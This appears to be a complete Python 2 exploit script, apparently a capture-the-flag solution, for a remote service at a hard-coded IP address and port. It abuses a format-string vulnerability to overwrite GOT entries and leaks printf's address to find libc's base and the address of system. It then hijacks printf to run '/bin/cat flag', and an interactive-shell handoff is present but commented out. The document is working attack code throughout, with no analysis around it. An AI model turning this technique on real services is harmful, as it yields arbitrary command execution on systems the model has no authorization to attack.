import struct
import time
import math
from socket import *
import telnetlib

s = socket(AF_INET, SOCK_STREAM)
s.connect(('104.131.90.29', 8004))

def recv_timeout(timeout=2):
    s.setblocking(0)
    total_data=[];
    data='';
    begin=time.time()
    while 1:
        if total_data and time.time()-begin > timeout:
            break
        elif time.time()-begin > timeout*2:
            break
        try:
            data = s.recv(8192)
            if data:
                total_data.append(data)
                begin = time.time()
            else:
                time.sleep(0.1)
        except:
            pass
    return ''.join(total_data)

def pad(string, length):
  return string+"\x90"*(length-len(string))

# PAYLOADS

print s.recv(512)

PUTS_PLT = 0x601018
payload = pad("%1808x%12$hn",16)
payload += struct.pack("<Q",PUTS_PLT)
s.send(payload+'\n')
recv_timeout()

base = ''
PRINTF_PLT = 0x601030
for i in range(0,8):
  payload = pad("%x"*17+'A%.1sZ',8*8)
  payload += struct.pack("<Q",PRINTF_PLT+i)
  s.send(payload+'\n')
  data = recv_timeout()
  data = data[data.index("A")+1:data.index("Z")]
  if len(data) == 0:
    base = '00' + base
  else:
    c = hex(ord(data[0]))[2:]
    base = '0'*(2-len(c)) + c + base

print "printf: " + hex(int(base, 16))
base = int(base, 16) - 0x55800
print "libc: " + hex(base)
SYSTEM_LIBC = hex(base + 0x45390)
print "system: " + SYSTEM_LIBC
SYSTEM_LIBC = SYSTEM_LIBC[2:]

# Write a desired address to the stack
payload = struct.pack("<Q",PRINTF_PLT)
payload += struct.pack("<Q",PRINTF_PLT+2)
s.send(payload+'\n')
recv_timeout()

# Access the stack from previous iteration
#payload = "%34$lx.%35$lx"
#s.send(payload+'\n')
#print recv_timeout()

addr = int(SYSTEM_LIBC[-4:], 16)
payload = "%"+str(addr)+"x%34$hn"
addr = int('1'+SYSTEM_LIBC[-8:-4], 16) - addr
payload += "%"+str(addr)+"x%35$hn"
s.send(payload+'\n')
recv_timeout()
s.setblocking(1)

s.send("/bin/cat flag"+'\n')
print "Flag: " + s.recv(2048)
s.close()

#t = telnetlib.Telnet()
#t.sock = s
#t.interact()
